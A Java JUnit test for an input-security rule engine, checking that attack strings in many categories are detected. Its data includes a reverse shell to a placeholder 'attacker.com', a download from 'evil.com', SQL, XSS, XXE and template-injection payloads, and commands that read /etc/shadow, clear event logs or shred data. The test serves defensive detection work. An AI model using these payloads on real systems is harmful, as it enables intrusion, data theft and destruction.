package org.example.input_security_starter.config;

import org.example.input_security_starter.engine.OptimizedRuleEngine;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertTrue;

@DisplayName("Remote Payload Rule Match Test")
class RemotePayloadRuleMatchTest {

    private OptimizedRuleEngine ruleEngine;

    @BeforeEach
    void setUp() {
        InputSecurityProperties properties = new InputSecurityProperties();
        ruleEngine = new OptimizedRuleEngine();
        ruleEngine.loadRules(properties.getRules());
    }

    @Test
    @DisplayName("All engine payloads should match expected rules")
    void allEnginePayloadsShouldMatchExpectedRules() {
        List<String> misses = new ArrayList<>();

        assertAllMatch(misses, "xss-attack", new String[]{
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "javascript:alert(document.cookie)",
                "<iframe src=javascript:alert(1)>",
                "<a href=javascript:alert(1)>click</a>",
                "<embed src=javascript:alert(1)>",
                "<object data=javascript:alert(1)>",
                "'-alert(1)-'",
                "\"><script>alert(1)</script>",
                "<img src=\"x\" onerror=\"alert(1)\">",
                "<svg><script>alert(1)</script></svg>",
                "<div onclick=\"alert(1)\">click</div>"
        });

        assertAllMatch(misses, "sql-injection", new String[]{
                "1' OR '1'='1",
                "1 UNION SELECT NULL--",
                "1'; DROP TABLE users--",
                "admin'--",
                "' OR 1=1 LIMIT 1--",
                "' UNION SELECT username,password FROM users--",
                "1' ORDER BY 1--",
                "1' ORDER BY 10--",
                "' AND 1=1--",
                "' AND 1=2--",
                "1'; WAITFOR DELAY '0:0:5'--",
                "1' AND SLEEP(5)--",
                "' OR ''='",
                "1' UNION ALL SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--"
        });

        assertAllMatch(misses, "code-execution", new String[]{
                "eval(alert(1))",
                "system('id')",
                "Class.forName('java.lang.Runtime')",
                "${runtime.exec('id')}",
                "setTimeout(alert(1),1000)"
        });

        assertAllMatch(misses, "command-injection", new String[]{
                "; cat /etc/passwd",
                "| whoami",
                "& dir",
                "`id`",
                "$(whoami)",
                "; ls -la",
                "| nc -e /bin/sh attacker.com 1234",
                "; wget http://evil.com/shell.sh -O /tmp/shell.sh"
        });

        assertAllMatch(misses, "ssrf-attack", new String[]{
                "http://169.254.169.254/latest/meta-data",
                "http://metadata.google.internal/computeMetadata/v1/",
                "gopher://127.0.0.1:6379/_INFO",
                "file:///etc/passwd",
                "dict://localhost:11211/stats"
        });

        assertAllMatch(misses, "path-traversal", new String[]{
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/etc/passwd",
                "....\\/....\\/....\\/etc\\/passwd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "../../../../etc/shadow"
        });

        assertAllMatch(misses, "ldap-injection", new String[]{
                "*)(uid=*))(|(uid=*",
                "admin)(&(password=*)",
                "*)(objectClass=*",
                ")(!(&(objectClass=*",
                "*)(cn=*"
        });

        assertAllMatch(misses, "xxe-injection", new String[]{
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/evil.dtd\">]><foo>&xxe;</foo>"
        });

        assertAllMatch(misses, "template-injection", new String[]{
                "${7*7}",
                "{{7*7}}",
                "#{T(java.lang.Runtime).getRuntime().exec('id')}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
                "${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}"
        });

        assertAllMatch(misses, "deserialization-attack", new String[]{
                "rO0ABXNyABFqYXZhLnV0aWwuQXJyYXlMaXN0eHAAAAABdwQAAAABdAAEVEVTVHg=",
                "aced0005737200116a6176612e7574696c2e486173684d6170",
                "O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}",
                "!!python/object/apply:os.system ['id']"
        });

        assertAllMatch(misses, "nosql-injection", new String[]{
                "{\"$ne\":null}",
                "{\"$where\":\"this.password.length > 0\"}",
                "{\"$regex\":\".*\"}",
                "{\"$gt\":\"\"}",
                "{\"$expr\":{\"$eq\":[1,1]}}"
        });

        assertAllMatch(misses, "installation-attack", new String[]{
                "crontab -e",
                "schtasks /create /tn backdoor",
                "/etc/cron.daily/evil.sh",
                "~/.ssh/authorized_keys",
                "REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        });

        assertAllMatch(misses, "c2-communication", new String[]{
                "frpc -c /tmp/frpc.ini",
                "ngrok tcp 3389",
                "chisel client 1.2.3.4:80 R:socks",
                "ew_for_linux -s ssocksd -l 1080",
                "ncat 10.0.0.1 -e /bin/sh"
        });

        assertAllMatch(misses, "actions-on-objectives", new String[]{
                "mysqldump -u root -p123 --all-databases",
                "cat /etc/shadow",
                "wevtutil cl Security",
                "shred /var/data.db",
                "dd if=/dev/zero of=/tmp/disk.img"
        });

        assertTrue(misses.isEmpty(), String.join("\n", misses));
    }

    private void assertAllMatch(List<String> misses, String expectedRule, String[] payloads) {
        for (String payload : payloads) {
            String matched = ruleEngine.match(payload);
            if (!expectedRule.equals(matched)) {
                misses.add("expected=" + expectedRule + ", actual=" + matched + ", payload=" + payload);
            }
        }
    }
}
